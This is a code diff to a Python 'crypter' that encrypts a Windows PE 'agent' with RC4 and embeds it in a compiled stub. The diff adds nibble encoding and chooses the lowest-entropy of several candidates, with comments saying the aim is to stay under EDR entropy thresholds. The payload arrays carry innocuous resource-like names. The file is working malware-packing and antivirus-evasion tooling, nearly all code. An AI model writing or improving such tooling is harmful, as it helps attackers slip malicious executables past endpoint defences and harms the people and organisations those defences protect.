@@ -17,6 +17,7 @@ Called automatically by build_agent_c.py during the two-pass build.
 """
 
 import argparse
+import math
 import os
 import random
 import secrets
@@ -27,6 +28,27 @@ import subprocess
 import sys
 import tempfile
 from pathlib import Path
+
+
+def shannon_entropy(data: bytes) -> float:
+    """
+    Calculate Shannon entropy of a byte sequence (0.0 – 8.0 bits/byte).
+
+    0.0 = all identical bytes, 8.0 = perfectly uniform distribution.
+    EDR heuristics typically flag PE sections with entropy > 6.5–7.0.
+    """
+    if not data:
+        return 0.0
+    freq = [0] * 256
+    for b in data:
+        freq[b] += 1
+    length = len(data)
+    entropy = 0.0
+    for count in freq:
+        if count > 0:
+            p = count / length
+            entropy -= p * math.log2(p)
+    return entropy
 
 
 def _derive_key(seed: bytes, key_len: int = 256) -> bytes:
@@ -70,8 +92,27 @@ def rc4_crypt(data: bytes, key: bytes) -> bytes:
     return bytes(out)
 
 
-def generate_stub_payload_h(encrypted: bytes, seed: bytes) -> str:
-    """Generate C header with encrypted payload and seed (not the key)."""
+def nibble_encode(data: bytes) -> bytes:
+    """
+    Encode each byte as two bytes from a 16-char alphabet ('A'-'P').
+
+    Each input byte B is split into high nibble and low nibble:
+        encoded[i*2]   = 0x41 + (B >> 4)     # 'A' + high nibble (0-15)
+        encoded[i*2+1] = 0x41 + (B & 0x0F)   # 'A' + low nibble  (0-15)
+
+    Output uses only bytes 0x41-0x50 (16 distinct values).
+    Shannon entropy ≈ 4.0 bits/byte — well below EDR thresholds (~6.5-7.0).
+    Trade-off: 2x size increase.
+    """
+    out = bytearray(len(data) * 2)
+    for i, b in enumerate(data):
+        out[i * 2]     = 0x41 + (b >> 4)
+        out[i * 2 + 1] = 0x41 + (b & 0x0F)
+    return bytes(out)
+
+
+def generate_stub_payload_h(encoded: bytes, seed: bytes, decoded_size: int) -> str:
+    """Generate C header with nibble-encoded payload and seed (not the key)."""
 
     def format_bytes(data: bytes, var_name: str, per_line: int = 16) -> str:
         lines = []
@@ -85,7 +126,7 @@ def generate_stub_payload_h(encrypted: bytes, seed: bytes) -> str:
         return "\n".join(lines)
 
     # Use innocuous variable names — looks like embedded resources
-    payload_arr = format_bytes(encrypted, "g_res_data")
+    payload_arr = format_bytes(encoded, "g_res_data")
     seed_arr = format_bytes(seed, "g_res_cfg")
 
     return f"""/*
@@ -99,8 +140,9 @@ def generate_stub_payload_h(encrypted: bytes, seed: bytes) -> str:
 
 {seed_arr}
 
-#define RES_DATA_SIZE {len(encrypted)}u
-#define RES_CFG_SIZE  {len(seed)}u
+#define RES_DATA_SIZE    {len(encoded)}u
+#define RES_DECODED_SIZE {decoded_size}u
+#define RES_CFG_SIZE     {len(seed)}u
 
 #endif /* STUB_PAYLOAD_H */
 """
@@ -197,6 +239,26 @@ def build_stub(
     return output_exe
 
 
+NUM_CANDIDATES = 4
+
+
+def _generate_candidate(pe_bytes: bytes) -> tuple:
+    """
+    Generate one encryption candidate in memory.
+    Returns (seed, encoded_payload, entropy).
+    """
+    seed = secrets.token_bytes(64)
+    rc4_key = _derive_key(seed, 256)
+    encrypted = rc4_crypt(pe_bytes, rc4_key)
+
+    # Verify round-trip
+    assert rc4_crypt(encrypted, rc4_key) == pe_bytes, "RC4 round-trip failed!"
+
+    encoded = nibble_encode(encrypted)
+    ent = shannon_entropy(encoded)
+    return seed, encoded, ent
+
+
 def crypt_pe(
     input_pe: Path,
     output_exe: Path,
@@ -204,39 +266,42 @@ def crypt_pe(
     arch: str = "x64",
     key_size: int = 32,
     debug: bool = False,
+    candidates: int = NUM_CANDIDATES,
 ) -> Path:
     """
     Full crypter pipeline:
     1. Read input PE
-    2. Generate random seed
-    3. Derive RC4 key from seed
-    4. RC4 encrypt payload
-    5. Generate stub_payload.h with encrypted data + seed (NOT the key)
-    6. Compile stub → output
+    2. Generate N candidates (different seeds → different ciphertexts)
+    3. Nibble-encode each, measure Shannon entropy
+    4. Pick the lowest entropy candidate
+    5. Compile only the winner into the final stub
     """
-    # Read the agent PE
     pe_bytes = input_pe.read_bytes()
     pe_size = len(pe_bytes)
 
-    # Generate random seed (64 bytes — stored in the stub)
-    seed = secrets.token_bytes(64)
+    # Generate N candidates in memory, pick lowest entropy
+    print(f"[*] Generating {candidates} candidates, measuring entropy...")
+    best_seed = None
+    best_encoded = None
+    best_entropy = 9.0  # impossibly high
 
-    # Derive RC4 key from seed (256 bytes — NOT stored anywhere)
-    rc4_key = _derive_key(seed, 256)
+    for i in range(candidates):
+        seed, encoded, ent = _generate_candidate(pe_bytes)
+        tag = "  ←  best" if ent < best_entropy else ""
+        print(f"    candidate {i+1}: entropy={ent:.4f}  seed={seed[:8].hex()}...{tag}")
+        if ent < best_entropy:
+            best_entropy = ent
+            best_seed = seed
+            best_encoded = encoded
 
-    # Encrypt with RC4
-    encrypted = rc4_crypt(pe_bytes, rc4_key)
-
-    # Verify round-trip
-    decrypted = rc4_crypt(encrypted, rc4_key)
-    assert decrypted == pe_bytes, "RC4 round-trip failed!"
+    print(f"[*] Winner: entropy={best_entropy:.4f}  seed={best_seed[:8].hex()}...")
 
     # Create temp build directory
     build_dir = Path(tempfile.mkdtemp(prefix="stub_build_"))
 
     try:
-        # Generate payload header (contains seed, NOT the key)
-        header_content = generate_stub_payload_h(encrypted, seed)
+        # Generate payload header with the winning candidate
+        header_content = generate_stub_payload_h(best_encoded, best_seed, pe_size)
         header_path = build_dir / "stub_payload.h"
         header_path.write_text(header_content)
 
@@ -248,12 +313,14 @@ def crypt_pe(
         if not stub_src.exists():
             raise FileNotFoundError(f"Stub source not found: {stub_src}")
 
-        # Compile
+        # Compile only the winner
         build_stub(stub_src, header_path, output_exe, arch, junk, debug=debug)
 
-        print(f"[+] Crypter: {pe_size} bytes payload → "
-              f"{output_exe.stat().st_size} bytes stub "
-              f"(RC4, seed: {seed[:8].hex()}...)")
+        final_entropy = shannon_entropy(output_exe.read_bytes())
+        print(f"[+] Crypter: {pe_size} bytes → "
+              f"{len(best_encoded)} bytes encoded (payload entropy={best_entropy:.4f}) → "
+              f"{output_exe.stat().st_size} bytes stub (file entropy={final_entropy:.4f}) "
+              f"(RC4+nibble, seed: {best_seed[:8].hex()}...)")
 
         return output_exe
 
@@ -272,6 +339,8 @@ def main():
     parser.add_argument("--arch", choices=["x64", "x86"], default="x64")
     parser.add_argument("--key-size", type=int, default=32,
                         help="Seed size in bytes (default: 32)")
+    parser.add_argument("--candidates", type=int, default=NUM_CANDIDATES,
+                        help=f"Number of encryption candidates to evaluate (default: {NUM_CANDIDATES})")
     args = parser.parse_args()
 
     if not args.input.exists():
@@ -285,7 +354,8 @@ def main():
 
     args.output.parent.mkdir(parents=True, exist_ok=True)
 
-    crypt_pe(args.input, args.output, stub_dir, args.arch, args.key_size)
+    crypt_pe(args.input, args.output, stub_dir, args.arch, args.key_size,
+             candidates=args.candidates)
 
 
 if __name__ == "__main__":
